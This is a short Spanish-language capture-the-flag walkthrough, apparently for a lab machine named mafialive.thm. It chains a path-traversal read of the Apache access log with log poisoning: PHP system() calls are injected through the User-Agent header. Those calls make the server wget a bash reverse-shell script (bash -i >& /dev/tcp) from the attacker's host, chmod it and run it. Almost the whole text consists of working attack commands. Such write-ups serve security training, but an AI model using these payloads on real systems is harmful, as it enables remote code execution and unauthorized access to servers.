Una máquina con esta vulnerabilidad en esta ruta:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../././var/log/apache2/access.log
```
Podemos intentar hacer un log poisoning, de tal forma que si probamos en ejecutar una petición con curl podemos inyectar texto dentro del apartado del user agent:
```bash
curl -s -X GET 'http://mafialive.thm' -H 'User-Agent:Pruebas'
```
Dentro del user-agent inyectamos un código php malicioso para ejecutar comandos, veremos que funciona:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('whoami'); ?>"
```
Creamos un fichero pwned.sh
```bash
#!/bin/bash
bash -i >& /dev/tcp/<IP>/PORT 0>&1
```
Y lo compartimos con un servidor python:
```python
python3 -m http.server 80
```
ahora ejecutamos el comando wget para obtener este archivo y después bash pwned.sh para ejecutarlo y recibir la reverse shell:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://10.8.100.91/pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('chmod 777 pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('bash pwned.sh'); ?>"
```
Una vez ejecutado lo anterior, refrescamos y habremos recibido la reverse shell